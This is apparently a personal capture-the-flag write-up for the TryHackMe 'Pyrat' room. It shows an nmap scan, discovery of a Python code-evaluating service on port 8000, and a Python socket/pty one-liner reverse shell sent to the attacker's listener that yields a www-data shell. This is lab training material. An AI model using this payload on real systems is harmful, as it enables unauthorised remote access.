<code>
https://tryhackme.com/r/room/pyrat
  
**Enumeration**

┌──(duke㉿kali)-[~]
└─$ nmap -A -Pn  10.10.4.202   
Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-10 02:53 CDT
Nmap scan report for 10.10.4.202
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=10/10%Time=6707880C%P=x86_64-pc-linux-gnu%r(G

**http-server-header: SimpleHTTP/0.6 Python/3.11.2**

┌──(duke㉿kali)-[~]
└─$ nc pyrat.thm 8000                                                                                                                                                                                   
import
invalid syntax (<string>, line 1)
dsd
name 'dsd' is not defined
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.30.202",5002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

**get reverse shell**
┌──(duke㉿kali)-[~]
└─$ nc -lvnp 5002                                                   
listening on [any] 5002 ...
connect to [10.9.30.202] from (UNKNOWN) [10.10.4.202] 57226
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

  
<\code>
